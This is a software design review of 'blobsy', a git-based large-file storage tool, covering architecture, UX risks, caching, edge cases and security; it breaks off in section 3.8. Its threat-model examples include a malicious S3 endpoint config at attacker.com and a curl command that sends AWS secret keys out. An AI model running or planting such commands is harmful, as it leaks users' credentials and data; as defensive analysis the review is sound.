# blobsy V2 Design Review (Round 6 - Opus 4.6)

**Date:** 2026-02-20

**Status:** Senior Engineering Review

**Reviewer:** Claude (Opus 4.6)

**Document Reviewed:** [blobsy-design-v2.md](blobsy-design-v2.md)

**Related Research:**
[research-2026-02-19-sync-tools-landscape.md](../../research/current/research-2026-02-19-sync-tools-landscape.md)

* * *

## Executive Summary

**Overall Assessment: Strong architecture with some implementation risks**

This is a well-crafted design that makes smart architectural decisions:
- ✅ Per-file `.yref` approach elegantly eliminates manifest complexity
- ✅ Delegating to git for versioning/conflicts is brilliant
- ✅ Content-addressable storage with pluggable layouts is the right choice
- ✅ External tool delegation (aws-cli, rclone) is pragmatic
- ⚠️ User error scenarios (push/commit coordination) need stronger safeguards
- ⚠️ Performance at scale (10K+ files) requires validation
- ⚠️ Template system adds cognitive load - consider simplification

**Grade: A- (Very Good with Reservations)**

**Recommendation: Proceed with V1 implementation** after addressing critical issues
identified below.

* * *

## 1. Architectural Strengths

### 1.1 Core Insight: “Git is the Manifest”

**Brilliant.** The shift from manifest-based architecture to per-file `.yref` files is
the key innovation here:

- Eliminates all manifest sync complexity
- Git naturally handles versioning, branching, merging
- Each file is independent - no cascading conflicts
- Scales to any number of files (git routinely handles millions)

This is architecturally cleaner than DVC (which still has `.dvc` pointer files but with
more complex manifest coordination) and far simpler than the original blobsy design.

**Why this works:**

```
Traditional approach (manifests):
  manifest.json -> lists files -> sync manifest -> sync files
  Problem: manifest becomes a coordination bottleneck

blobsy V2 approach (per-file refs):
  file1.bin.yref -> file1 blob
  file2.bin.yref -> file2 blob
  Git handles the "manifest" (commit tree)
  Problem: eliminated
```

### 1.2 Delegation Strategy

**Smart pragmatism.** The design delegates to existing systems:

| Concern | Delegated To | Why This Works |
| --- | --- | --- |
| Versioning | Git | Proven, universal, no reinvention |
| Conflict resolution | Git merge | Everyone knows this already |
| Transfer | aws-cli/rclone/s5cmd | Battle-tested, high-performance |
| Compression | Node.js zlib | Built-in, zero dependencies |
| Storage | S3-compatible backends | Ubiquitous, pluggable |

This follows the Unix philosophy: do one thing well, compose with others.

**Comparison to alternatives:**
- **DVC:** Reinvents some transfer logic (custom protocols)
- **Git LFS:** Requires custom server-side component
- **blobsy:** Delegates everything it can, stays thin

### 1.3 Content-Addressable Storage

The default timestamp+hash template
(`{iso_date_secs}-{content_sha256_short}/{repo_path}`) is clever:
- Chronologically sortable for age-based cleanup
- Content hash for integrity verification
- Path-browsable for debugging
- Batch dedup (same-second pushes of same content)

**Architectural soundness:** Using content hashes as keys makes the system immutable and
cacheable:
- Same hash = same blob (idempotent uploads)
- No overwrite risks from concurrent pushes
- Natural deduplication
- Integrity verification built-in

However, see concerns in Section 3.3 about cross-time duplication.

### 1.4 Separation of Concerns

The design cleanly separates three concerns:

1. **What to track:** Externalization rules (`min_size`, `always`, `never`)
2. **How to store:** Compression rules + key templates
3. **Where to store:** Backend configuration

This is good modularity.
Users can change backends without rewriting rules, or adjust compression without
changing what’s tracked.

* * *

## 2. Design Strengths vs. Alternatives

Comparing to existing tools from the research doc:

### 2.1 vs Git LFS

| Aspect | blobsy | Git LFS |
| --- | --- | --- |
| Backend flexibility | ✅ Pluggable (S3, R2, local, custom) | ❌ Requires LFS-compatible host |
| Storage layout | ✅ Configurable templates | ❌ Fixed content-addressable |
| Compression | ✅ Configurable per-file | ❌ None |
| Setup complexity | ⚠️ Moderate (config + backend) | ✅ Simple (`git lfs install`) |
| Git integration | ⚠️ Manual push/commit | ✅ Automatic on `git push` |
| Server requirement | ✅ None (works with plain S3) | ❌ Requires LFS server |

**Gap:** blobsy gives you flexibility; Git LFS gives you simplicity and tight
integration.

**Market position:** blobsy targets teams that need pluggable backends or custom storage
layouts. Git LFS targets teams on GitHub/GitLab/Bitbucket.

### 2.2 vs DVC (Data Version Control)

| Aspect | blobsy | DVC |
| --- | --- | --- |
| Ref file format | ✅ Per-file `.yref` (YAML) | ✅ Per-file `.dvc` (YAML) |
| Directory tracking | ✅ One `.yref` per file | ⚠️ One `.dvc` for whole dir |
| Hash algorithm | ✅ SHA-256 | ❌ MD5 |
| Runtime | ✅ Node.js (ubiquitous) | ⚠️ Python (dependency) |
| Remote browsability | ✅ Path-based templates available | ❌ Content-addressed only |
| Maturity | ❌ New | ✅ Production-proven |

**Gap:** blobsy is “what DVC should have been” architecturally - per-file refs, SHA-256,
no Python dependency, path-browsable storage option.

**Advantage:** DVC has years of production use and a rich ecosystem.

### 2.3 vs rclone

| Aspect | blobsy | rclone |
| --- | --- | --- |
| Git integration | ✅ Native | ❌ None |
| Versioning | ✅ Via git history | ❌ None (sync only) |
| Compression | ✅ Per-file rules | ❌ Pass-through only |
| Backend support | ⚠️ S3 + local + custom | ✅ 70+ backends |
| Simplicity | ⚠️ Requires git knowledge | ✅ Just sync |

**Gap:** Different use cases.
blobsy = versioned data in git repos.
rclone = pure file sync.

**Synergy:** blobsy can delegate to rclone as a transfer engine (already in design).

### 2.4 Market Position

**blobsy fills the “Git LFS done right” niche:**
- Git-native large file storage (like Git LFS)
- Pluggable backends (unlike Git LFS)
- Flexible storage layouts (unlike DVC)
- No server requirement (unlike Git LFS)
- No Python dependency (unlike DVC)

This is a **real gap** in the ecosystem.
Teams wanting git-integrated large file storage without vendor lock-in have no good
option today.

* * *

## 3. Critical Issues and Risks

### 3.1 User Error: Push/Commit Coordination ⚠️ **HIGH RISK**

You identify this correctly as “the most common mistake” but the design doesn’t prevent
it:

**Scenario 1: Pushed but not committed**
```bash
$ blobsy push              # uploads data, sets remote_key in .yref
# User forgets to git commit the .yref
# Other users see stale .yref pointing to old hash
# Their blobsy pull downloads old data
```

**Scenario 2: Committed but not pushed**
```bash
$ blobsy track file.bin    # updates .yref with new hash
$ git add file.bin.yref && git commit
# User forgets to blobsy push
# Other users pull from git, see the updated ref, run blobsy pull
# Error: "missing (no remote!)" - blob doesn't exist
```

**Why this is problematic:**
- In Git LFS, `git push` triggers LFS upload automatically - no coordination needed
- In DVC, `dvc push` is explicit but you can’t accidentally commit without data
- In blobsy, you must remember two separate operations in the right order

This is a **fundamental UX problem** that will cause frustration.

**Detection difficulty:**

The “pushed but not committed” case is invisible to the pusher:
```bash
# On Alice's machine after blobsy push (but before git commit)
$ blobsy status
✓ data/model.bin (committed and synced)  # WRONG! Not actually committed

# Git status shows uncommitted changes, but user might not notice
$ git status
modified: data/model.bin.yref

# On Bob's machine after git pull (Alice didn't commit)
$ blobsy pull
✓ data/model.bin (pulling old version)  # Silently gets stale data
```

**Recommendations:**

**1. Add `blobsy commit` convenience command (CRITICAL):**

```bash
$ blobsy commit -m "Update model"
# Internally runs:
#   1. blobsy push (upload all tracked files)
#   2. git add *.yref .gitignore
#   3. git commit -m "Update model"
# Atomically keeps git and remote in sync
```

This should be the **recommended workflow** in documentation.
The manual two-step process should be “advanced usage.”

**2. Make `blobsy sync` stricter by default:**

```bash
$ blobsy sync
Error: 2 .yref files have uncommitted changes.

Uncommitted refs:
  ◑ data/model.bin (synced but not committed)
  ○ data/dataset.parquet (not synced, not committed)

This means git doesn't know about these changes yet.
Other users won't see your updates until you commit.

Options:
  1. Run 'blobsy commit -m "message"' to push and commit atomically
  2. Run 'git add *.yref && git commit' manually, then retry
  3. Run 'blobsy sync --allow-uncommitted' to force (NOT RECOMMENDED)

Learn more: https://github.com/jlevy/blobsy/docs/workflows#commit-coordination
```

Make `--allow-uncommitted` required to bypass this check (opt-in to risky behavior).

**3. Add pre-push git hook (installed by `blobsy init`):**

```bash
#!/bin/bash
# .git/hooks/pre-push
# Installed by: blobsy init

# Check if any .yref files are committed but data not pushed
if blobsy check-unpushed --quiet; then
  exit 0
else
  echo "Error: Some .yref files are committed but data not pushed to remote."
  echo ""
  echo "Committed refs without remote data:"
  blobsy check-unpushed
  echo ""
  echo "Run 'blobsy push' before pushing to git, or use 'git push --no-verify' to skip this check."
  exit 1
fi
```

**4. Add `blobsy check-unpushed` command:**

```bash
$ blobsy check-unpushed
⚠ 2 .yref files in git HEAD but remote blobs missing:
  data/model-v2.bin.yref (committed in abc123, remote_key not set)
  results/output.json.yref (committed in def456, remote blob not found)

This means you committed .yref files but forgot to push the data.
Run 'blobsy push' to upload missing blobs.
```

**5. CI/CD integration:**

```yaml
# .github/workflows/verify-blobsy.yml
name: Verify blobsy integrity
on: [pull_request]
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm install -g blobsy
      - run: blobsy check-unpushed  # Fails PR if data not pushed
```

**Impact if not addressed:**

This issue will cause **frequent user frustration** and data synchronization bugs.
It’s the #1 risk to blobsy’s usability.

### 3.2 Template System Complexity ⚠️ **MEDIUM RISK**

The template system is powerful but has UX and correctness issues:

**Problem 1: Cognitive load**

Users must understand template semantics:
```yaml
remote:
  key_template: "{iso_date_secs}-{content_sha256_short}/{repo_path}{compress_suffix}"
```

Questions users will ask:
- What happens if I change this template later?
- Why are there 4 different recommended patterns?
- Which one should I use for my use case?
- What does `{content_sha256_short}` mean?
  Why not full hash?
- When is `{compress_suffix}` added?
  What if I change compression settings?

This is **expert-level configuration** presented as a default setting.

**Problem 2: Consistency enforcement**

> “The key_template must be consistent across all users (set in the committed
> .blobsy.yml)”

But how is this enforced?
What if:
- User A has stale local config (`~/.blobsy.yml`) that overrides the repo config?
- Someone force-pushes a `.blobsy.yml` with a different template?
- Different branches have different templates (feature branch vs main)?
- User edits `.blobsy.yml` locally and doesn’t commit it?

**Scenario:**
```bash
# Alice's .blobsy.yml (committed)
key_template: "{iso_date_secs}-{content_sha256_short}/{repo_path}"

# Bob's ~/.blobsy.yml (local override)
key_template: "sha256/{content_sha256}"

# Alice pushes: data/model.bin -> 20260220T140322Z-abc123/data/model.bin
# Bob pushes: data/model.bin -> sha256/abc123...

# Now two copies of same file in remote!
# Git shows no conflict (different .yref remote_key values are both valid)
```

This breaks deduplication and creates orphaned blobs.

**Problem 3: Compression suffix behavior**

The `{compress_suffix}` variable is awkward:
```yaml
# Push with compression enabled
remote_key: "20260220T140322Z-abc123/data/model.bin.zst"

# Later disable compression in config and re-push same file
remote_key: "20260220T140322Z-abc123/data/model.bin"  # Different key!

# Now two copies: .zst and non-.zst
# Old .zst blob is orphaned (unreachable until GC)
```

This breaks the principle that “same content = same key.”

**Why this matters:** Compression is a storage optimization, not semantic content.
Changing compression settings shouldn’t change identity.

**Recommendations:**

**1. Simplify to named layouts (CRITICAL):**

```yaml
remote:
  layout: chronological  # Named preset, not raw template
  # Options: chronological (default), content-addressable, branch-isolated, path-mirrored

  # Advanced users can still override:
  # layout: custom
  # key_template: "my-custom/{repo_path}"
```

Map layouts to templates internally:
```typescript
const LAYOUT_TEMPLATES = {
  chronological: "{iso_date_secs}-{content_sha256_short}/{repo_path}{compress_suffix}",
  'content-addressable': "sha256/{content_sha256}",
  'branch-isolated': "{git_branch}/sha256/{content_sha256}",
  'path-mirrored': "shared/{repo_path}",
};
```

**Benefits:**
- Simpler mental model (choose a strategy, not write a template)
- Self-documenting (layout name conveys intent)
- Less error-prone (validated presets)
- Migration path (can provide conversion tool between layouts)

**2. Validate template changes (CRITICAL):**

```bash
$ blobsy config set key_template "new-template"

⚠ WARNING: Changing key_template will affect where blobs are stored.

Current template: {iso_date_secs}-{content_sha256_short}/{repo_path}
New template:     sha256/{content_sha256}

Impact:
  - All future pushes will use the new template
  - Existing blobs will NOT be migrated
  - Old blobs will become unreachable (orphaned until GC)
  - 127 existing .yref files reference old keys

Recommendations:
  1. Run 'blobsy migrate-template' to move existing blobs (requires re-upload)
  2. Run 'blobsy gc' after migration to clean up old blobs
  3. Commit the new .blobsy.yml so all users use the same template

Confirm template change? [y/N]
```

**3. Fix compression suffix (CRITICAL):**

Compression state should not affect the remote key.
Two options:

**Option A: Separate compression from identity**
```yaml
# .yref file
sha256: abc123...
size: 1048576
remote_key: "sha256/abc123"  # No .zst suffix
compressed: zstd              # Metadata only
compressed_size: 262144
```

Remote key stays the same regardless of compression.
Blobsy knows to decompress based on metadata in `.yref`.

**Option B: Version the object in key**
```yaml
remote_key: "sha256/abc123/v1"  # Version increments on re-upload with different compression
```

**Recommendation:** Option A is cleaner and matches how HTTP Content-Encoding works
(transparent to URLs).

**4. Add template consistency check:**

```bash
$ blobsy doctor

Backend: s3 (bucket: my-datasets, region: us-east-1)
Key template: {iso_date_secs}-{content_sha256_short}/{repo_path}

⚠ WARNING: Template mismatch detected
  Repo config (.blobsy.yml):    {iso_date_secs}-{content_sha256_short}/{repo_path}
  Your local config (~/.blobsy.yml): sha256/{content_sha256}

  Your local config overrides the repo config!
  This will cause you to push to different keys than other users.

  Fix: Remove key_template from ~/.blobsy.yml to use repo default.
```

### 3.3 Default Template May Not Deduplicate Well ⚠️ **MEDIUM RISK**

The default timestamp+hash template creates a subtle problem:

```yaml
key_template: "{iso_date_secs}-{content_sha256_short}/{repo_path}{compress_suffix}"
```

**Issue:** Same content pushed at different times = different keys

```
# Monday 10:00: Alice pushes model.bin (hash abc123)
20260217T100000Z-abc123/data/model.bin

# Tuesday 14:30: Bob pushes identical model.bin (hash still abc123)
20260218T143000Z-abc123/data/model.bin  # DIFFERENT KEY, duplicate storage!
```

This wastes storage and defeats the purpose of content-addressable deduplication.

**Why this happens:**

The timestamp is based on **when you push**, not when the content was created.
Same content pushed twice = two timestamps = two keys.

**You acknowledge this:**

> “⚠️ Cross-time duplication: Same content pushed at different times = different keys”

**But recommend it as the default:**

> “This is the recommended default for most teams”

**Analysis:**

The tradeoff is:
- **Pro:** Chronological sorting enables age-based cleanup
  (`ls | head -n 100 | xargs rm`)
- **Con:** Loses deduplication across time (storage waste)

**When this is problematic:**

1. **Multiple developers working on same files**
   - Alice and Bob both work on `model.bin`
   - Both push updates at different times
   - Storage grows linearly with pushes, not with unique content

2. **Rollbacks and reverts**
   - Revert to old commit, re-push same old file
   - Creates new timestamp prefix, duplicates old blob

3. **Branch merges**
   - Feature branch pushes blob with timestamp T1
   - Merge to main, someone re-pushes with timestamp T2
   - Duplicate storage

**Recommendation 1: Make content-addressable the default**

```yaml
# Default
remote:
  layout: content-addressable  # Maximize deduplication
```

Most users care more about storage efficiency than chronological browsing.

**Recommendation 2: Hybrid approach**

```yaml
# Timestamp as metadata, not in key
key_template: "sha256/{content_sha256}/{iso_date_secs}"
# Result: sha256/abc123/20260217T100000Z
#         sha256/abc123/20260218T143000Z
# Groups by content, sorts by time within each content group
```

This gives you both:
- Deduplication (same hash = same prefix)
- Chronological visibility (different timestamps = separate objects, can see push
  history)

**Recommendation 3: Add dedup report**

```bash
$ blobsy stats --dedup

Storage summary:
  Total blobs: 1,247
  Unique content (by hash): 834
  Duplicate blobs: 413 (33%)
  Wasted storage: 5.2 GB

Top duplicates:
  data/model.bin (hash abc123): 8 copies
    20260217T100000Z-abc123/data/model.bin (500 MB)
    20260218T143000Z-abc123/data/model.bin (500 MB)
    ...

Recommendation: Consider switching to layout: content-addressable
to eliminate cross-time duplication.
```

### 3.4 Stat Cache Correctness Issues ⚠️ **MEDIUM RISK**

You rely on `mtime_ms` + `size` for the stat cache but acknowledge mtime is unreliable:

> “Why mtime is safe in the local cache but not in refs: The stat cache is local and
> per-machine.”

This is reasonable but still has edge cases:

**Edge case 1: Millisecond resolution may not be enough**

Node.js `fs.stat()` provides `mtimeMs` (millisecond float) but:
- Some tests modify files rapidly (within milliseconds)
- Build tools can touch many files in <1ms (e.g., `make -j32`)
- Modern filesystems have nanosecond resolution (ext4, APFS, NTFS)

**Scenario:**
```bash
# Build system modifies file at T+0.000ms
echo "content1" > file.bin
# Blobsy hashes it at T+0.500ms, caches mtime=T+0.000
# Build system modifies file at T+0.800ms (same millisecond!)
echo "content2" > file.bin

# Blobsy checks cache: mtime still T+0 (rounded), size still 9 bytes
# Cache hit! Uses old hash abc123
# Actual hash should be def456
# BUG: Wrong hash in .yref
```

**Edge case 2: Clock skew**

- NTP adjustments can make time go backwards
- Docker containers may have different clocks than host
- VM/container startup time != host time

**Scenario:**
```bash
# Host machine at T=1000
echo "content" > file.bin
blobsy track file.bin  # Caches mtime=1000, hash=abc123

# NTP adjusts clock backwards to T=950
echo "different" > file.bin  # File gets mtime=950

# Blobsy checks cache: cached mtime=1000 > current mtime=950
# Backwards time = ???
# Depending on implementation, might use stale hash
```

**Edge case 3: File systems that don’t preserve mtime**

- Some network mounts (NFS, SMB) with clock skew
- Some FUSE filesystems
- Container overlay filesystems
- `git checkout` doesn’t preserve mtime (sets to checkout time)

**Scenario:**
```bash
# Commit A: file.bin with hash abc123
blobsy track file.bin
git add file.bin.yref && git commit

# Commit B: file.bin with hash def456
# (modified by someone else)
git pull  # Gets new .yref with hash def456

git checkout main  # File gets current time as mtime
blobsy status      # Checks cache, mtime changed, re-hashes
# Correct behavior

# But if stat cache persists across git checkout:
git checkout main@{1}  # Back to commit A
# File gets new mtime (current time)
# Cache miss, re-hashes, gets abc123 (correct)
# So far so good

# Pathological case: cache corruption
# If cache somehow has future mtime from a newer commit,
# and we check out old commit, cache might give wrong hash
```

**Edge case 4: Intentional mtime manipulation**

- `touch -t` to set timestamps
- Build systems that preserve mtimes (e.g., `cp -p`, `rsync -a`)
- Unzip/tar preserves original mtimes

**Scenario:**
```bash
# Archive from 2020 with old mtimes
tar xzf old-data.tar.gz
# Files have mtime=2020-01-01

blobsy track data/  # Hashes all files, caches mtime=2020-01-01

# Files never modified again (mtime stays 2020-01-01)
# Stat cache always hits, never re-hashes
# Good? Maybe. Unless content somehow changed without mtime update.
```

**Recommendations:**

**1. Use nanosecond resolution (CRITICAL):**

```typescript
import { stat } from 'fs/promises';

const stats = await stat(filePath);
const mtimeNs = stats.mtimeNs;  // Nanosecond precision (BigInt)
// or: stats.mtimeMs for milliseconds (less precise but sufficient for most cases)
```

Node.js provides `mtimeNs` (nanosecond) and `mtimeMs` (millisecond float).
Using nanoseconds reduces collision risk by 1,000,000x.

**2. Make stat cache conservative:**

```typescript
// Cache entry
interface StatCacheEntry {
  mtimeNs: bigint;
  size: number;
  sha256: string;
  cachedAt: number;  // When we cached this (for staleness detection)
}

// Cache hit condition (conservative)
function isCacheValid(entry: StatCacheEntry, currentStat: Stats): boolean {
  // Exact match on size and mtime (nanosecond precision)
  if (entry.size !== currentStat.size) return false;
  if (entry.mtimeNs !== currentStat.mtimeNs) return false;

  // Additional safety: if cached more than 30 days ago, re-hash
  // (protects against clock skew, corruption)
  const age = Date.now() - entry.cachedAt;
  if (age > 30 * 24 * 60 * 60 * 1000) return false;

  return true;
}
```

**3. Add `--no-cache` flag for safety:**

```bash
# Force re-hash everything (ignore cache)
$ blobsy sync --no-cache

# Use cache for speed (default)
$ blobsy sync

# Verify cache correctness (hash everything, compare to cache)
$ blobsy verify --check-cache
Verifying 1,247 files against stat cache...
  1,245 cache hits (99.8%) - all correct
  2 cache misses (0.2%) - files changed
Cache accuracy: 100%
```

**4. Add cache diagnostics:**

```bash
$ blobsy doctor

Stat cache: ~/.cache/blobsy/stat-cache.json
  Entries: 1,247
  Total size: 156 KB
  Oldest entry: 45 days ago
  Cache hit rate (last sync): 98.5%

⚠ WARNING: 2 cache entries older than 30 days
  Consider running 'blobsy sync --no-cache' to refresh
```

**5. Document cache limitations:**

```markdown
## Stat Cache

blobsy uses a local cache to avoid re-hashing unchanged files.
The cache is stored at `~/.cache/blobsy/stat-cache.json`.

**How it works:**
- Before hashing a file, blobsy checks if size and mtime match cache
- If match: use cached hash (skip read + hash computation)
- If mismatch: read file, compute hash, update cache

**When cache is invalidated:**
- File size changes
- File mtime changes (nanosecond precision)
- Cache entry older than 30 days
- User runs with `--no-cache` flag

**Limitations:**
- Not reliable after `git checkout` (mtime changes)
- Not reliable with clock skew or NTP adjustments
- Not reliable if mtime manually modified (`touch -t`)

**Best practices:**
- Let blobsy manage the cache automatically (default)
- Use `--no-cache` when you need guaranteed correctness
- Run `blobsy verify` periodically to check integrity
```

### 3.5 Missing Edge Cases

Several scenarios are not addressed in the design:

**Edge case 1: Concurrent operations**

**Scenario:**
```bash
# Terminal 1
$ blobsy push    # Starts uploading 1,000 files

# Terminal 2 (same repo, same machine)
$ blobsy push    # Also starts uploading

# What happens?
# - Both processes read .yref files
# - Both try to upload same files concurrently
# - S3 PUTs are safe (last write wins, but content-addressed so doesn't matter)
# - But: both processes may write .yref files (race condition)
```

**Risk:** `.yref` file corruption if both processes update `remote_key` simultaneously.

**Recommendation:** Add file locking:

```typescript
import { open } from 'fs/promises';

async function withLock<T>(lockPath: string, fn: () => Promise<T>): Promise<T> {
  const lockFile = await open(lockPath, 'wx');  // Exclusive create
  try {
    return await fn();
  } finally {
    await lockFile.close();
    await unlink(lockPath);
  }
}

// Usage
await withLock('.blobsy/lock', async () => {
  // Safe: only one blobsy process can run at a time
  await syncAll();
});
```

**Edge case 2: Partial file writes**

**Scenario:**
```bash
# Process A is writing a large file
$ dd if=/dev/zero of=file.bin bs=1M count=1000 &  # 1 GB, takes 10 seconds

# Process B runs blobsy track while file is being written
$ blobsy track file.bin
# File is only 400 MB so far (partial)
# blobsy hashes 400 MB, records wrong hash in .yref
# File finishes writing to 1 GB
# .yref has hash of partial file (BUG!)
```

**Recommendation:** Skip files with recent mtime:

```typescript
// In blobsy track
const stats = await stat(filePath);
const ageMs = Date.now() - stats.mtimeMs;

if (ageMs < 1000) {  // Modified in last second
  console.warn(`Skipping ${filePath}: file modified too recently (may still be writing)`);
  console.warn(`Wait a moment and run 'blobsy track' again`);
  return;
}
```

**Edge case 3: Large files that don’t fit on disk**

**Scenario:**
```bash
# Remote has 100 GB file
# Local disk has 50 GB free

$ blobsy pull
Error: No space left on device
```

**Current design:** “No lazy materialization in V1” - entire file must download.

**Recommendation:** Add selective pull:

```bash
# Pull specific files only
$ blobsy pull data/small-file.bin

# Pull by pattern
$ blobsy pull --include="*.parquet" --exclude="*.bin"

# Pull up to size limit
$ blobsy pull --max-size=10gb
```

**Edge case 4: Symlink cycles**

**Scenario:**
```bash
$ ln -s . self        # Symlink to current directory
$ blobsy track .      # Recurse into directory
# Follows 'self' symlink, enters same directory again
# Infinite recursion!
```

**Current design:** “symlinks are followed on push”

**Recommendation:** Detect and error on cycles:

```typescript
const seenInodes = new Set<string>();

function trackDirectory(dirPath: string, depth = 0) {
  if (depth > 100) {
    throw new Error(`Symlink depth exceeded (possible cycle)`);
  }

  const stats = await lstat(dirPath);
  const inode = `${stats.dev}:${stats.ino}`;

  if (seenInodes.has(inode)) {
    throw new Error(`Symlink cycle detected: ${dirPath}`);
  }
  seenInodes.add(inode);

  // Recurse...
}
```

**Edge case 5: Case sensitivity (macOS vs Linux)**

**Scenario:**
```bash
# On macOS (case-insensitive)
$ blobsy track Data/file.bin
Created Data/file.bin.yref

$ git add Data/file.bin.yref
$ git commit && git push

# On Linux (case-sensitive)
$ git pull
$ ls -la
# Git creates: Data/file.bin.yref

$ blobsy pull
Error: File not found: data/file.bin  # Lowercase!
# macOS user created Data/, but Linux sees data/
```

**Recommendation:** Warn on case-only differences:

```bash
$ blobsy track Data/file.bin

⚠ WARNING: Case-sensitive filename detected
  Tracked path: Data/file.bin
  Found existing (different case): data/file.bin

  On case-insensitive filesystems (macOS), these are the same file.
  On case-sensitive filesystems (Linux), these are different files.

  This may cause sync issues across platforms.

  Recommendation: Use consistent case (lowercase is safest).
```

**Edge case 6: Unicode normalization (macOS NFC vs NFD)**

**Scenario:**
```bash
# On macOS (NFD normalization)
$ touch "café.txt"      # Displays as café
$ blobsy track "café.txt"
Created café.txt.yref

$ ls | hexdump
# Shows: cafe\u0301.txt  (NFD: e + combining acute)

# On Linux (no normalization)
$ git pull
$ ls | hexdump
# Shows: café.txt (NFC: single precomposed character)

$ blobsy pull
Error: File not found: café.txt
# Different byte representation!
```

**Recommendation:** Normalize all paths to NFC:

```typescript
import { normalize } from 'path';

function normalizePath(p: string): string {
  return normalize(p).normalize('NFC');  // Unicode NFC normalization
}
```

**Edge case 7: Very large directories (10K+ files)**

**Scenario:**
```bash
# Directory with 100,000 tracked files
$ blobsy status
# Must read 100,000 .yref files (YAML parsing)
# Estimated time: 100,000 * 1ms = 100 seconds
```

**Recommendation:** Optimize for scale:

1. **Parallel YAML parsing:**

   ```typescript
   const refs = await Promise.all(
     refPaths.map(path => parseYRefFile(path))
   );
   ```

2. **Binary format option:**

   ```typescript
   // .yref.bin (optional, used automatically for repos with >1000 files)
   // 4 bytes: magic number
   // 32 bytes: sha256 (binary, not hex)
   // 8 bytes: size (uint64)
   // N bytes: remote_key (length-prefixed string)
   ```

3. **Cached status:**

   ```bash
   $ blobsy status --cached
   # Uses last status snapshot, shows staleness
   Status snapshot from 5 minutes ago (use --live for current state)
   ```

### 3.6 GC Safety Concerns ⚠️ **HIGH RISK** (V2 Feature)

The GC design requires safety parameters but doesn’t prevent misuse:

```bash
$ blobsy gc --depth=1
# DANGER: only keeps last 1 commit!
# Deletes all blobs not in the most recent commit
# Loses all history
```

**Scenario:**
```bash
# Main branch has 100 commits
# Feature branches have 20 branches with various commits
# Total: 500 blobs across all history

$ blobsy gc --depth=1
# Scans: only HEAD commit on each branch (20 commits)
# Finds: 50 referenced blobs
# Deletes: 450 blobs (90% of data!)
# All historical data is gone
```

This is **catastrophic data loss** from a simple typo.

**Recommendations:**

**1. Require explicit confirmation for shallow depth (CRITICAL):**

```bash
$ blobsy gc --depth=5

⚠ DANGER: Garbage collection with shallow depth

--depth=5 means only the last 5 commits on each branch will be scanned.
Blobs not referenced in those commits will be PERMANENTLY DELETED.

Branches: 12 branches will be scanned
Commits: ~60 commits will be scanned (5 per branch)
Estimated deletion: Unknown (run --dry-run first)

This is IRREVERSIBLE. Deleted blobs cannot be recovered.

Type 'delete-old-blobs' to confirm: _
```

**2. Add --min-age safety (CRITICAL):**

```bash
$ blobsy gc --depth=5 --min-age=7d
# Safety: only GC blobs that are:
#   (not in last 5 commits) AND (older than 7 days)
# Recent blobs are safe even if not in recent commits
```

**3. Dry-run should be mandatory first (CRITICAL):**

```bash
$ blobsy gc --depth=5
Error: First run with --dry-run to preview deletions.

$ blobsy gc --depth=5 --dry-run
Scanning 12 branches, 60 commits...
Found 234 referenced blobs (kept)
Found 89 unreferenced blobs (would delete):
  20260115T100000Z-abc123/data/old-model.bin (500 MB, age: 35 days)
  20260116T143000Z-def456/results/archive.csv (1.2 MB, age: 34 days)
  ...

Total to delete: 89 blobs (45 GB)
Total to keep: 234 blobs (120 GB)

To proceed with deletion, run:
  blobsy gc --depth=5 --confirm
```

**4. Add graduated safety levels:**

```yaml
# In .blobsy.yml
gc:
  safety: strict  # (default) Require confirmation, --min-age, dry-run
  # safety: moderate  # Require confirmation, dry-run
  # safety: permissive  # Allow without confirmation (NOT RECOMMENDED)
```

**5. Add GC log and undo:**

```bash
$ blobsy gc --depth=5 --confirm
...
Deleted 89 blobs (45 GB)

GC summary saved to: .blobsy/gc-log/2026-02-20-gc.json

To undo (within 30 days):
  aws s3 restore --bucket my-bucket --before-date 2026-02-20

$ blobsy gc undo 2026-02-20
# Restores blobs from S3 versioning or backup
# (requires S3 versioning enabled)
```

### 3.7 Security: Malicious Backend Configuration ⚠️ **MEDIUM RISK**

Your security model is good:

> “command backends disallowed from repo config by default”

This prevents supply-chain attacks via malicious `.blobsy.yml` with arbitrary shell
commands.

**However, there’s a gap:**

**Scenario: Data exfiltration via malicious S3 endpoint**

```yaml
# Malicious .blobsy.yml (committed to repo)
backends:
  default:
    type: s3  # Not 'command', so allowed by default
    bucket: innocent-looking-name
    endpoint: https://attacker.com/fake-s3  # Exfiltrates data!
    region: us-east-1
```

When a user runs `blobsy push`:
1. blobsy reads malicious config from repo
2. Uploads files to attacker’s server (masquerading as S3)
3. Attacker gets all tracked data
4. No warning to user (looks like normal S3 upload)

**Attack vector:**
- Clone malicious repo
- Run `blobsy push` (uploads proprietary data to attacker)
- User doesn’t notice (endpoint looks like valid S3)

**Recommendations:**

**1. Warn on non-AWS endpoints (CRITICAL):**

```bash
$ blobsy push

⚠ WARNING: Non-standard S3 endpoint detected

Backend: default
Endpoint: https://attacker.com/fake-s3
Bucket: innocent-looking-name

This endpoint is NOT an official AWS S3 endpoint.
Your data will be sent to: attacker.com

Standard AWS S3 endpoints:
  - *.amazonaws.com (AWS regions)
  - *.r2.cloudflarestorage.com (Cloudflare R2)
  - *.backblazeb2.com (Backblaze B2)

Do you trust this endpoint? [y/N]

To skip this check, add to ~/.blobsy.yml:
  trusted_endpoints:
    - "attacker.com"
```

**2. Add endpoint whitelist to user config:**

```yaml
# ~/.blobsy.yml (user's local config, not in repo)
security:
  trusted_endpoints:
    - "*.amazonaws.com"
    - "*.r2.cloudflarestorage.com"
    - "*.backblazeb2.com"
    - "our-company-s3-proxy.com"

  # Reject any endpoint not in whitelist
  strict_mode: true
```

**3. Show actual destination before first push:**

```bash
$ blobsy push

First-time backend verification:
  Type: s3
  Endpoint: https://attacker.com/fake-s3
  Bucket: innocent-looking-name
  Region: us-east-1
  Credentials: AWS_ACCESS_KEY_ID (from environment)

Test connection: [attempting]
✓ Connected successfully

Files to push: 12 files (5.2 GB)
First 3 files:
  data/model.bin -> s3://innocent-looking-name/sha256/abc123/data/model.bin
  data/dataset.csv -> s3://innocent-looking-name/sha256/def456/data/dataset.csv
  ...

Proceed with push to attacker.com? [y/N]
```

**4. Require explicit trust for new backends:**

```bash
$ blobsy trust
Trust backend 'default' (https://attacker.com/fake-s3)?
This will be stored in ~/.blobsy/trusted-backends.json
Trusted backends can push/pull without confirmation.
[y/N]
```

### 3.8 Credential Exposure in Command Backends

If credentials are in environment variables and a user runs a `command` backend:

```yaml
backends:
  evil:
    type: command
    push_command: "curl https://attacker.com/steal?key=$AWS_SECRET_ACCESS_KEY"
```

